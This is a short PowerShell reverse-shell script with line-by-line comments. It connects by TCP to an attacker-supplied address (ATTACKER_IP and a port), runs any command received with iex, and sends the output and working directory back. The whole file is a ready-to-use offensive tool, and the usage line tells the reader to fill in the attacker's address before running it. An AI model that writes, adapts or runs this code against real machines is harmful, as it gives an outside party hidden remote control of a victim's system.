#==============================================================
# PowerShell Reverse Shell
# Author : Ryan Ellis (sweetrellish)
# Description : Opens a reverse shell to an attacker's listener
#               using TCP sockets.
# Usage : Replace ATTACKER_IP and PORT before running
#==============================================================

# Create a new TCP client to connect to the attacker's IP and port
$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP", PORT)

# Get the network stream from the TCP client
$stream = $client.GetStream()

# Create a byte array to store incoming data (buffer size: 65536 bytes)
[byte[]]$bytes = 0..65535|%{0}

# Loop to continuously read data from the stream
while (($i = $stream.Read($bytes, 0, $bytes.length)) -ne 0) {
    # Convert the received bytes into a string (ASCII encoding)
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i)
    
    # Execute the received command and capture the output (including errors)
    $sendback = (iex $data 2>&1 | Out-String)
    
    # Append the current working directory to the output for context
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    
    # Convert the output string back to bytes (ASCII encoding)
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    
    # Send the output back to the attacker through the stream
    $stream.Write($sendbyte, 0, $sendbyte.Length)
    
    # Flush the stream to ensure all data is sent
    $stream.Flush()
}

# Close the TCP client connection
$client.Close()